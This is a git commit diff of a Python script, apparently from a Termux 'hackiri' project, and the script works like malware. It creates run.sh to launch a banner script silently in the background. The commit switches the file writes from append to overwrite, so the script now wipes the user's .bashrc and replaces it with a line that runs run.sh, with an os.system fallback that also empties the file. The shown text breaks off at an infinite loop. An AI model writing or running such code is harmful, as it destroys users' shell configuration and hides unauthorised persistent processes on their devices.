8deaa67d5f51bec24264a1d072f84356b0bb03b3
hackir-godrat <95535445+hackir-godrat@users.noreply.github.com>
2022-01-07 00:36:27 +0330

    Update run.py

--- run.py
+++ run.py
@@ -1,17 +1,17 @@
 import os
 os.chdir('/data/data/com.termux//files/home')
-file = open('run.sh' , 'a+')
+file = open('run.sh' , 'w+')
 file.write('python hackiri/baner.py &> /dev/null &')
 file.close()
 try:
-    file2 = open('.bashrc' , 'a')
+    file2 = open('.bashrc' , 'w')
     file2.write('bash run.sh')
 except:
     try:
         os.system('> .bashrc')
     except:
         pass
-    file2 = open('.bashrc', 'a')
+    file2 = open('.bashrc', 'w')
     file2.write('bash run.sh')
 while True:
     try:
